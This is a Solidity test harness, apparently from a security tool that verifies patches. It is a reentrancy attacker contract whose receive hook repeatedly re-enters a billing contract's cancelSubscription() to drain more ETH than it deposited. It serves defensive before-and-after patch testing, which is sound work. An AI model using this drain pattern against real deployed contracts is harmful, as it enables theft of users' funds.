// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/// @title ReentrancyAttacker
/// @notice DEMO ONLY — the exploit harness SENTINEL uses to *verify* a proposed
///         fix (architecture.md §5.2 patch verification). It re-enters a
///         SubscriptionBilling-style ``cancelSubscription()`` from its receive
///         hook before the target zeroes state, draining more than it deposited.
///
///         Against the vulnerable SubscriptionBilling the attack succeeds (it
///         pulls extra ETH); against SubscriptionBillingGuarded the re-entrant
///         call hits the reentrancy guard and the whole attack reverts. That
///         before/after is the proof the patch actually closes the hole.
///
///         NEVER deploy to a real network. Local Anvil fork only (Golden Rule #3).
interface ISubscriptionBilling {
    function subscribe(uint256 feePerCycle) external payable;
    function cancelSubscription() external;
}

contract ReentrancyAttacker {
    ISubscriptionBilling public immutable target;
    uint256 public received; // total ETH pulled out of the target
    uint256 public reentries; // how many nested re-entries fired
    uint256 public constant MAX_REENTRIES = 3;

    constructor(address _target) {
        target = ISubscriptionBilling(_target);
    }

    /// @notice Open the attacker's own subscription, prepaying ``msg.value``.
    function prime(uint256 feePerCycle) external payable {
        target.subscribe{value: msg.value}(feePerCycle);
    }

    /// @notice Trigger the drain — cancel, then re-enter from ``receive``.
    function attack() external {
        target.cancelSubscription();
    }

    /// @dev On refund, re-enter cancelSubscription before the target clears
    ///      state. The vulnerable target refunds again; the guarded target
    ///      reverts ("reentrant call"), unwinding the whole attack.
    receive() external payable {
        received += msg.value;
        if (reentries < MAX_REENTRIES) {
            reentries++;
            target.cancelSubscription();
        }
    }
}
